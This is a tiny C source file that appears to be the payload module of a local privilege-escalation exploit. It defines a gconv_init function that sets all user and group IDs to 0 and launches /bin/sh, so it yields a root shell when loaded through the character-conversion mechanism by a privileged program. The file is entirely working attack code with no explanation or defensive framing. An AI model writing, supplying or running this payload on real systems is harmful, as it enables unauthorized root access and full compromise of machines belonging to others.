#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
	setuid(0); setgid(0);
	seteuid(0); setegid(0);
	system("/bin/sh");
	exit(0);
};
